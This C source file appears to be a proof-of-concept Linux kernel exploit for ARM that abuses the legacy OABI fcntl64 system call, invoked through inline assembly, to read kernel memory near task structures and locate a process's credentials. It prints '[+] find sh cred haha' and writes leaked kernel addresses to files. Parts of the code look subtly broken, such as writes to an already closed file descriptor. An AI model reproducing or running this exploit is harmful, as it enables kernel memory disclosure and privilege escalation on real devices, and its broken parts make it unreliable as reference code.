#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <pthread.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <semaphore.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <sys/utsname.h>
#include <sys/ptrace.h>

// gcc -o a a.c libc.s -nostartfiles -nostdlib -static -Os
//
__attribute__((naked)) long sys_oabi_fcntl64(unsigned int fd, unsigned int cmd, unsigned long arg){
	
	__asm __volatile (
	"swi	0x9000DD\n"
	"mov	pc, lr\n"
	:   
	:
	:
	);
}

#define F_OFD_GETLK	36
#define F_OFD_SETLK	37
#define F_OFD_SETLKW 38

int _start(void)
{

	int fd = open("/proc/cpuinfo", O_RDONLY);
	struct flock *map_base = 0;
	struct flock *map_base2 = 0;

	if(fd == -1){
		write(1, "open error\n", 11);
		return -1;
	}

	map_base = (struct flock *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

	map_base->l_start = SEEK_SET;

	unsigned int f_task = 0xc1307080 + 500;
	read(0, &f_task, 4);

	if(sys_oabi_fcntl64(fd, F_OFD_GETLK, (long)map_base)){
		write(1, "fcnt error\n", 11);
		return -1;
	}


	unsigned int next_task = 0;
	unsigned int *juno= 0;
	unsigned int task_offset = 500;
	unsigned int comm_offset = 900;


	write(1, "[+] find sh cred haha\n", 22);


	write(1, f_task - task_offset + comm_offset, 5);
	write(1, "\n", 1);
	write(1, "done!\n", 6);


	int wtf;

	int junofd = open("./tmp", O_WRONLY);
	write(junofd, f_task, 4);
	close(junofd);

	int junofd2 = open("./tmp_cred", O_WRONLY);
	write(junofd, f_task+400-4, 4);
	close(junofd);


	// write(1, next_task - task_offset + comm_offset, 5);

	write(1, "\n", 1);
	write(1, "done!\n", 6);

	_exit(0);
}

